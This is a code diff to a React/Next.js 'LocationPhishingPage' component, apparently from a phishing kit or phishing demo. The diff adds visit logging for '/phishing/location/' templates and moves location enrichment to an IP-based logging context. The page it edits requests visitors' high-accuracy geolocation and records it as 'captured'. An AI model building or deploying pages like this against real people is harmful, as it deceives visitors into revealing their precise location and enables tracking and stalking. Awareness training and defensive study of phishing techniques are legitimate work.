@@ -1,3 +1,4 @@
+
 "use client";
 import { useEffect, useState } from 'react';
 import { useParams } from 'next/navigation';
@@ -41,6 +42,10 @@ export default function LocationPhishingPage() {
   const [error, setError] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
 
+  useEffect(() => {
+    addLog({ type: 'generic', data: { message: `Visited location phishing page: /phishing/location/${templateId}` } });
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [templateId]); // addLog is stable from context
 
   const handleLocationRequest = () => {
     if (!navigator.geolocation) {
@@ -63,6 +68,11 @@ export default function LocationPhishingPage() {
         };
         
         // Attempt to get city/country (client-side, best effort)
+        // This data enrichment is now primarily handled in LogContext for consistency
+        // but we can keep it here if Nominatim is preferred for client-side immediate feedback before LogContext processing.
+        // For this example, assuming LogContext handles primary enrichment based on IP.
+        // If client-side lat/lon to city/country is still desired here for the data payload:
+        /*
         try {
           const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${locationData.latitude}&lon=${locationData.longitude}&zoom=10&addressdetails=1`);
           if (response.ok) {
@@ -73,6 +83,7 @@ export default function LocationPhishingPage() {
         } catch (e) {
           console.warn("Could not fetch city/country from Nominatim:", e);
         }
+        */
 
         addLog({ type: 'location', data: locationData });
         setStatus('captured');
@@ -99,13 +110,6 @@ export default function LocationPhishingPage() {
       { timeout: 10000, enableHighAccuracy: true }
     );
   };
-
-  useEffect(() => {
-    // Optionally auto-trigger on page load if design implies it, or wait for button click.
-    // For this demo, let's make it user-triggered for clarity.
-    // handleLocationRequest(); // Uncomment for auto-trigger
-  }, []);
-
 
   return (
     <PhishingPageLayout 
